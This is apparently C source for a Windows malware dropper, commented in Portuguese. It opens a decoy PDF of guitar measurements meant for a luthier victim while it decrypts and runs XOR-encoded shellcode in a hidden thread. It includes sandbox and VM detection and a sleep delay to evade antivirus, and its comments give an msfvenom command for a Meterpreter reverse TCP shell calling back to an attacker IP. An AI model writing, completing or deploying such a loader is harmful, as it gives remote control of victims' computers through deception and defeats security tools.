#include <windows.h>
#include <shellapi.h> // Necessário para abrir o PDF real

// --- CONFIGURAÇÃO DO PAYLOAD ---
// 1. Gere no Debian: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.143 LPORT=4444 -f raw -o shellcode.bin
// 2. Rode o python3 encrypt.py shellcode.bin e cole o resultado abaixo:
unsigned char payload[] = { 0xa2 };
 // <--- SUBSTITUA AQUI
unsigned int payload_len = sizeof(payload);
unsigned char key = 0x77; // <--- CERTIFIQUE QUE É A MESMA CHAVE DO PYTHON

// --- FUNÇÃO DE DESCRIPTOGRAFIA ---
void decrypt(unsigned char* data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// --- ANTI-SANDBOX (PARA O DEFENDER NÃO PEGAR) ---
bool IsSandbox() {
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    GlobalMemoryStatusEx(&status);
    DWORD ramMB = (DWORD)(status.ullTotalPhys / 1024 / 1024);
    if (ramMB < 4096) return true; // Se for VM com pouca RAM, tchau.

    if (GetFileAttributesA("C:\\windows\\System32\\Drivers\\Vmmouse.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\windows\\System32\\Drivers\\VBoxGuest.sys") != INVALID_FILE_ATTRIBUTES) {
        return true; // Se for VirtualBox/VMware, tchau.
    }
    return false;
}

// --- MAIN (MODO INVISÍVEL) ---
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
    
    // 1. Abre o PDF real para o Luthier ler enquanto a shell corre atrás
    // O arquivo deve estar na mesma pasta com este nome exato:
    ShellExecuteA(NULL, "open", "Medidas_Paco_De_Lucia_Oficial_1971.pdf", NULL, NULL, SW_SHOWNORMAL);

    // 2. Anti-Sandbox (Opcional: Comente se for testar na SUA VM)
    // if (IsSandbox()) return 0;

    // 3. Delay de 15 segundos (Engana a análise rápida do AV)
    DWORD t1 = GetTickCount();
    Sleep(15000);
    DWORD t2 = GetTickCount();
    if ((t2 - t1) < 15000) return 0;

    // 4. Alocação Silenciosa (RW -> RX)
    LPVOID address = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (address == NULL) return 0;

    decrypt(payload, payload_len, key);
    RtlMoveMemory(address, payload, payload_len);

    DWORD oldProtect;
    VirtualProtect(address, payload_len, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Execução do Shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}
